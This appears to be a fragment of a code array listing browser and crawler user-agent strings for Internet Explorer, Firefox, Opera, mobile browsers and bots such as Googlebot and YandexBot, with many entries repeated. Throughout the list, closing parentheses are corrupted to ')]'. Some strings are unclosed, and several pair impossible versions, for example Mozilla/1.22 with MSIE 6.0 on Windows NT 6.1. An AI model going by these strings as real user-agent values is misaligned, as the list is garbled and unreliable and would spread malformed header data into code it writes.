"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)]",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.)] Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)]",
"Opera/9.80 (Windows NT 5.1; U; en-US)] Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)]",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4)] Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru)] Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US)] AppleWebKit/125.4 (KHTML, like Gecko, Safari)] OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 )] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5)] Gecko/20060706 K-Meleon/1.0",
"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)]",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux)] KHTML/4.3.5 (like Gecko)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)]",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)]",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US)] AppleWebKit/534.16 (KHTML, like Gecko)] Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)]",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7)] Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)]",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.)] Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)]",
"Opera/9.80 (Windows NT 5.1; U; en-US)] Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)]",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4)] Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)] Gecko/2008032620",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)] AddSugarSpiderBot www.idealobserver.com",
"Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)]",
"Mozilla/4.0 (compatible; Arachmo)]",
"Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)]",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)]",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)]",
"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)]",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)]",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)]",
"Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)]",
"Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)]",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)]",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )]",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )]",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)]",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)]",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)]",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable)] AppleWebKit/420+ (KHTML, like Gecko)]",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)] ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en)] AppleWebKit/419 (KHTML, like Gecko, Safari/419.3)] Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.2 (KHTML, like Gecko)] ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)] AppleWebKit/534.10 (KHTML, like Gecko)] Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
"Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)]",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3)] AppleWebKit/537.75.14 (KHTML, like Gecko)] Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)]",
"Mozilla/5.0 (PLAYSTATION 3; 2.00)]",
"Mozilla/5.0 (PLAYSTATION 3; 1.00)]",
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0)] Gecko/20100101 Thunderbird/24.4.0",
"Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)]",
"SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)]",
"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)]",
"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)]",
"Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3)] Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3)] Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)] (Prevx 3.0.5)] ",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8)] Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)] Gecko/20060111 Firefox/1.5.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none)])]",
"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en)] Opera 8.51",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1)] Gecko/20060111 Firefox/1.5.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp)] AppleWebKit/417.9 (KHTML, like Gecko)] Safari/417.8",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12)] Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru)] Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US)] AppleWebKit/125.4 (KHTML, like Gecko, Safari)] OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 )] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5)] Gecko/20060706 K-Meleon/1.0",
"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)]",
"Mozilla/1.22 (compatible; Konqueror/4.3; Linux)] KHTML/4.3.5 (like Gecko)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)]",
"Opera/9.80 (Macintosh; U; de-de)] Presto/2.8.131 Version/11.10",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9)] Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)] Gecko/20060706 IEMobile/7.0",
"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us)] AppleWebKit/531.21.10 (KHTML, like Gecko)] Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)]",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)]",
"Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)]",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)]",
"Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US)] AppleWebKit/534.16 (KHTML, like Gecko)] Chrome/10.0.648.205 Safari/534.16",
"Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)]",
"Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7)] Gecko/20091221 Firefox/3.5.7",
"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)]",
"Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.)] Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)]",
"Opera/9.80 (Windows NT 5.1; U; en-US)] Presto/2.8.131 Version/11.10",
"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)]",
"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4)] Gecko/20050720 Minimo/0.007",
"BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)]",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)]",
"Opera/9.20 (Windows NT 6.0; U; en)]",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1)] Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)]",
"Opera/10.00 (X11; Linux i686; U; en)] Presto/2.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL)] AppleWebKit/528.16 (KHTML, like Gecko)] Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13)] Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)]",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)]",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)]",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3)] Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8)] Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7)] Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)]",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)]",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)]",
"Opera/9.80 (Windows NT 5.2; U; ru)] Presto/2.5.22 Version/10.51",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)]",
"Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)]",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)]",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3)] Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)]",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)] Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)] AppleWebKit/532.1 (KHTML, like Gecko)] Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)]",
"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru)] Presto/2.4.15",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US)] AppleWebKit/125.4 (KHTML, like Gecko, Safari)] OmniWeb/v563.57",
"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 )] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)]",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)]",
"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5)] Gecko/20060706 K-Meleon/1.0",
"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
"Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)]",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de)] AppleWebKit/418 (KHTML, like Gecko)] Shiira/1.2.2 Safari/125",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64)]; en-US; rv:1.8.1.6)] Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)]",
"Mozilla/5.0 (SymbianOS/9.1; U; en-us)] AppleWebKit/413 (KHTML, like Gecko)] Safari/413",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)]",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)]",
"Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)]",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)]",
